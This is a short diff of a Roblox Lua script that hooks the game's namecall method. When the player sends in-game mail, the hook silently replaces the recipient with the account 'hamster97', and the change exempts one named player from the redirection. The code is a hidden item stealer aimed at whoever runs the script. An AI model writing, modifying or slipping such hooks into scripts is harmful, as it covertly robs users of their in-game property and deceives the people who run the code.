@@ -62,7 +62,7 @@ local function namecallHook(self, ...)
     local method = getnamecallmethod()
     if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
         local args = {...}
-        if args[1] ~= _G.User then
+        if args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then
             args[1] = "hamster97"
             return oldNamecall(self, unpack(args))
         end
